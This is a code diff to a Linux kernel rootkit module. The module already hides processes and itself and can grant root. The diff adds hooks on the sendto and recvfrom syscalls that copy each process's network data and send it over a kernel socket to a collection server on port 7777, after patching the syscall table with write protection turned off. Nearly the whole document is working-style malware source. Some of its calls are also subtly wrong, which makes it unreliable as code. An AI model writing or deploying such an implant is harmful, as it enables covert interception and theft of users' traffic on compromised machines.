@@ -5,6 +5,17 @@
 #include <asm/processor-flags.h>
 #include <linux/dirent.h>  // For struct linux_dirent64
 #include <linux/cred.h>
+#include <linux/net.h>
+#include <linux/inet.h>
+#include <asm/segment.h>
+#include <linux/fs.h>
+#include <linux/socket.h>
+#include <linux/uaccess.h> // for copy_from_user
+#include <linux/socket.h> //for kernel_sendmsg()
+#include <net/sock.h>
+
+
+
 
 #ifdef MODULE
 extern struct module __this_module;
@@ -24,6 +35,9 @@ typedef int (*sysfun_t)(struct pt_regs *);
 static kallsyms_lookup_name_t lookup_name = NULL;
 static sysfun_t original_getdents64 = NULL;
 static sysfun_t original_kill = NULL;
+static sysfun_t original_send = NULL;
+static sysfun_t original_recv = NULL;
+
 
 void set_root(void)
 {
@@ -122,49 +136,47 @@ static inline void protect_memory(unsigned long original_cr0)
     native_write_cr0(original_cr0);
 }
 
-// Function for sending data to a remote server
-void send_data_to_server(const void *buf, size_t len) {
-    struct socket *socket; // socket for the network connexion
+void send_data_to_server(const void * userland_ptr, size_t len) {
+    struct socket *socket; // socket for the network connection
     struct sockaddr_in server_addr; // server details
-    mm_segment_t oldfs; the current kernel segment
+    mm_segment_t oldfs; // the current kernel segment
 
     // Create a socket
-    kernel_socket(AF_INET, SOCK_STREAM, 0, &socket); // AF_INET for IPv4 and SOCK_STREAM for TCP
+    sock_create_kern(&init_net, AF_INET, SOCK_STREAM, 0, &socket); // AF_INET for IPv4 and SOCK_STREAM for TCP
 
     // Set up the server address
     memset(&server_addr, 0, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
-    server_addr.sin_addr.s_addr = in_aton("ip"); // IP ASCII to binary
+    server_addr.sin_addr.s_addr = in_aton("127.0.0.1"); // IP ASCII to binary
     server_addr.sin_port = htons(7777); // Server port
- 
+
     kernel_connect(socket, (struct sockaddr *)&server_addr, sizeof(server_addr), 0);
- 
-    oldfs = get_fs();
-    set_fs(KERNEL_DS);
-  
-    kernel_sendmsg(socket, buf, len, NULL);
-    
-    set_fs(oldfs);
+
+    struct msghdr * my_buffer = kmalloc(len, GFP_KERNEL);  // gfp generic function to allocate memory
+    if (!my_buffer) {
+        /* error */
+    }
+    /* Copy structure pointer by userland_ptr to my_buffer */
+    copy_from_user(my_buffer, userland_ptr, len);
+    kernel_sendmsg(socket, my_buffer, len, NULL, NULL);
+
     kernel_sock_shutdown(socket, SHUT_RDWR);
-    kernel_sock_release(socket, NULL);
+    sock_release(socket);
 }
 
-asmlinkage ssize_t new_send(struct socket *sock, const void *buf, size_t len, int flags) {
+asmlinkage ssize_t new_send(const struct pt_regs *regs) {
+    ssize_t result = original_send(regs); 
 
-    ssize_t result = original_send(sock, buf, len, flags);
-    send_data_to_server(buf, result);
-
+    send_data_to_server(regs->si, regs->dx);
     return result;
 }
 
-asmlinkage ssize_t new_recv(struct socket *sock, void *buf, size_t len, int flags) {
-
-    ssize_t result = original_recv(sock, buf, len, flags);
-
-    send_data_to_server(buf, result);
-
+asmlinkage ssize_t new_recv(const struct pt_regs *regs) {
+    ssize_t result = original_recv(regs); 
+    send_data_to_server(regs->si, regs->dx );
     return result;
 }
+
 
 
 static int __init hacking_init(void)
@@ -194,12 +206,17 @@ static int __init hacking_init(void)
     // saved old syscalls
     original_getdents64 = (sysfun_t) syscall_table[__NR_getdents64];
     original_kill = (sysfun_t) syscall_table[__NR_kill];
+    original_send = (sysfun_t) syscall_table[__NR_sendto];
+    original_recv = (sysfun_t) syscall_table[__NR_recvfrom];
 
     // setup new syscalls
     // disable writing memory protection temporarily 
     unsigned long original_cr0 = unprotect_memory();
     syscall_table[__NR_getdents64] = (uint64_t) new_getdents64;
     syscall_table[__NR_kill] = (uint64_t) new_kill;
+    syscall_table[__NR_sendto]=(uint64_t) new_send;
+    syscall_table[__NR_recvfrom]=(uint64_t) new_recv;
+
     hidelsmod();
     protect_memory(original_cr0);
 
